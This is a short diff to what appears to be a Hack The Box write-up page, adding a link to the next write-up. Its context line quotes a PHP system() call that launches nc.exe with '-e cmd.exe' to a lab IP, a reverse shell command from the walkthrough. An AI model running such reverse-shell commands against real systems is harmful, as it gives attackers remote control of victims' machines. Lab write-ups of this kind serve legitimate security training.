@@ -993,4 +993,5 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 <br>
 <br>
 #### Previous Hack The Box write-up : [Hack The Box - Irked](/hack-the-box/irked/)
+#### Next Hack The Box write-up : [Hack The Box - Lightweight](/hack-the-box/lightweight/)
 <hr>
